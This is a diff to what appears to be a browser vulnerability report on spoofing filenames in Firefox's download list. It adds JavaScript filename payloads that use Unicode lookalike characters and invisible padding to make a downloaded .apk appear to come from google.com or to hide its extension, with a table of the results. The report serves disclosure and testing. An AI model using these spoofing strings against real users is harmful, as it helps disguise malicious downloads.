@@ -7,7 +7,15 @@ The download list renders the page-controlled filename as the entry title. The t
 and `/` survive Firefox's filename sanitization, so a page can make a downloaded `.apk`
 appear to come from `google.com`.
 
-## Payload
+## Payloads
+
+Variant A — fake "From" line, whole string fits in the title:
+
+```js
+const name = "ini aplikasi apa From https\u2236\u2215\u2215google.com.apk";
+```
+
+Variant B — hidden extension, invisible padding pushes `.apk` past the ellipsis:
 
 ```js
 const name = "https\u2236\u2215\u2215google.com" + "\u2800".repeat(40) + ".apk";
@@ -15,15 +23,17 @@ const name = "https\u2236\u2215\u2215google.com" + "\u2800".repeat(40) + ".apk";
 
 - `U+2236` RATIO — looks like `:`
 - `U+2215` DIVISION SLASH — looks like `/`
-- `U+2800` BRAILLE PATTERN BLANK — invisible filler, pushes `.apk` past the ellipsis
+- `U+2800` BRAILLE PATTERN BLANK — invisible filler
 
 ## Result
 
-| | |
-|---|---|
-| Saved filename | `https∶∕∕google.com` + 40×U+2800 + `.apk` |
-| Visible title | `https∶∕∕google.com` + blanks |
-| Hidden | `.apk` |
+| Variant | Visible title | Hidden |
+|---|---|---|
+| A | `ini aplikasi apa From https∶∕∕google.com.apk` | nothing |
+| B | `https∶∕∕google.com` + blanks | `.apk` |
+
+Variant A only fits without padding: the title is 265px wide and holds about 45 characters.
+Adding `U+2800` padding pushes the tail past the ellipsis.
 
 Firefox 160 is not affected by this variant: its download item uses `crop="center"`, so the
 extension stays visible.
